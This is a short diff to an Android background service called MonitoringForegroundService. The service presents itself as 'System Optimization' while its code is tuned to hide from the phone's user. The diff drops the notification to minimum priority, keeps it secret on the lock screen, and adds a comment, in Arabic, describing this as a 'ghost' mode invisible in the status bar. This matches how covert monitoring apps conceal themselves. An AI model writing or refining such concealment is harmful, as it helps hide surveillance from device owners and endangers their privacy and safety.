@@ -258,7 +258,7 @@ class MonitoringForegroundService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "System Optimization Services",
-                NotificationManager.IMPORTANCE_LOW // هادئ وغير مزعج
+                NotificationManager.IMPORTANCE_MIN // شبح: هادئ تماماً وغير ظاهر في شريط الحالة
             ).apply {
                 description = "Handles essential system optimization tasks in the background"
                 setShowBadge(false)
@@ -278,12 +278,12 @@ class MonitoringForegroundService : Service() {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Optimization")
             .setContentText("Monitoring system health and performance")
-            .setSmallIcon(android.R.drawable.ic_popup_sync)
-            .setOngoing(true)
-            .setSilent(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSmallIcon(android.R.drawable.ic_menu_preferences)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setCategory(Notification.CATEGORY_SERVICE)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pendingIntent)
+            .setSilent(true)
             .build()
     }
 }
